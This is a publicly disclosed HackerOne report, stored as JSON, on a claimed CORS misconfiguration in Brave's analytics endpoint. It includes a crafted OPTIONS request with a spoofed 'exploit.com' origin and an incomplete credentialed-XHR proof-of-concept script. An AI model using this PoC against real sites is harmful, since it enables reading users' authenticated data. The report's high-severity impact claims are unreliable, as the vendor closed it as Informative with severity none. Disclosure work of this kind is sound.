@@ -1,0 +1,121 @@
+{
+  "id": 954512,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTQ1MTI=",
+  "url": "https://hackerone.com/reports/954512",
+  "title": "Cross-origin resource sharing misconfiguration (CORS)",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "none",
+  "readable_substate": "Informative",
+  "created_at": "2020-08-09T16:57:44.973Z",
+  "submitted_at": "2020-08-09T16:57:45.118Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "drwx",
+    "url": "/drwx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-04T00:34:52.551Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-04T00:18:53.476Z",
+  "team_member_agreed_on_going_public_at": "2020-09-04T00:34:52.462Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi!\n\nIn this report I want to describe High level bug which can seriously compromise a user account.\n\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\n\nIn my tests, I found the relevant vulnerability using different methods. I detected the CORS vulnerability at the relevant address with the OPTIONS method. In addition, the server version information is also observed in the relevant response.\n\nSteps for reproduce\n\n1) Send this request\n\nOPTIONS /piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser&idsite=2&rec=1&r=571761&h=19&m=14&s=56&url=https%3A%2F%2Fbrave.com%2Fmillion%2F&_id=&_idts=1596989696&_idvc=1&_idn=1&_refts=0&_viewts=1596989696&send_image=1&cookie=1&res=1366x768&gt_ms=3109&pv_id= HTTP/1.1\nHost: analytics.brave.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: image/webp,*/*\nOrigin: exploit.com\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://brave.com/million/\n\nIn response headers you can see headers:\n\nAccess-Control-Allow-Origin: exploit.com\nAccess-Control-Allow-Credentials: true\n\nSo you can write exploit:\n\n<!DOCTYPE html>\n<html>\n   <head>\n      <script>\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 && this.status == 200) {\n                        document.getElementById(\"emo\").innerHTML = alert(this.responseText);\n            }\n         };\n         xhttp.open(\"GET\", \"/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser&idsite=2&rec=1&r=571761&h=19&m=14&s=56&url=https%3A%2F%2Fbrave.com%2Fmillion%2F&_id=&_idts=1596989696&_idvc=1&_idn=1&_refts=0&_viewts=1596989696&send_image=1&cookie=1&res=1366x768&gt_ms=3109&pv_id=\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      </script>\n   </head>\n  \nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 941945,
+      "file_name": "Origin.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hM4gaTHnJ5DJz9bcSos1MZFx?response-content-disposition=attachment%3B%20filename%3D%22Origin.png%22%3B%20filename%2A%3DUTF-8%27%27Origin.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUE4VWKCP%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000515Z&X-Amz-Expires=1398&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD6naMrPZZcKfw7S6RXCNehBLHuBcQnfLCcCCzYVvyBhwIgOqSfz2K2%2BFXY10I9q28LCuPYFM7LqF2g8H5OnbFOUPUqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNLV2P%2BPpkD3KMlnJyqOBYoB1mhdDbMSMzjL6Tibpm9I1ONzySXNg7df%2Fs8d0FU2JbuXuNacisQ1X660QSmG%2F3%2BciqIkW5jCUNJBvJZk5Pc85RSmwByIMx%2BhYE1p7B3Qyj05OrJSHdiom26i7Usa06wvKeSo%2FpOM1VA%2B38eTy1XA8c3RhSUXf%2B419EZfOgpn9Hi5jg0TA2wJ%2Bfw0OxHv%2BWeIYPRC6Fh%2FFd16jMcb%2FCPylpHZLUTPm7l0HsAsWf5LwZcU1oMDYI9ikkagk%2FxOHfLfpJ5skiC7Awd9AOMuEOs1jFntp%2BiUq1QdKg6JgJudAue3XDA8SQJmU%2BKmnly4czKwaoB0bBG4q%2FeGIFkzpUR3HydBL5Xn1qhvY%2FjLs0xTJRgOrC5OPtWUsNhCt5AUyViMhFPlViUp6oDoo0pJSdoReUmSetXoxfjOGkMtdAgg3z9d4mLhhTOBScDteqr7zFB02RKEBjQeoYqZSdFEM8K5JfR8NxBEf4hIKtK4KRZsIHiSzMR2YarABtC2%2BBlYv6dJfdv7TB4l7ktIKy7XKXSIMopeBMJoGMZYeGOpGBrDJF%2FKhtgTodkCDW5t%2FDacPF%2BDFCxEQP8BhNmF4YU47aIFpbICOoXLIEJNo2V9wVCbq5kqlLPO7iYqaJGC1keyM0HgB02RLGj3HTxU3AazIsMDq%2FXjx35eNcluNPo2nsW5qHqqzmv3OdWDZ1f2gDlV%2Fx9UuC%2Fjiam6rXog2ASpuJAgqAIjI9XVhgrE4fu1%2FoKpEgP6O21MoARrxyqUbtHjuVq5HOy9o2dZep5p62daN6BrYyVjM8BGydI7gAY%2BcU3GbTT7YunbXzbRNNO8k7ZvHtH%2BfiqS70HNd19qmOERGPGWMlgo7tXY8gTDOJmh1jDhx%2BLMBjqxAXBHOTuP43afPoNrwlfRVffcwZJut8laZzsJ0dGVZUX6Ovg5HOz96w3vVsbEEyMv3vcJO0B3YRgKP7XewFZxCiUEQedTqzQgEy1bi6avgXNpMGKs9WzjScjEO7g1gALkUIHSsw49GeJ%2FC%2FAG6kEx4y%2BGRlSgNUjhIZ4fBdCgahpCo5l4WOUXXyFrIpKAcdehJ0%2FlDXveWOGawZbsfNzLkjNPgIR%2FKDAidiU7psJ3jOyCBA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b8d8522707bdc22fec88721da3eae3164f7797cd8cb15bfff487a853a549045f",
+      "file_size": 48624,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "destinedtohack"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 7965,
+    "asset_type": "URL",
+    "asset_identifier": "brave.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
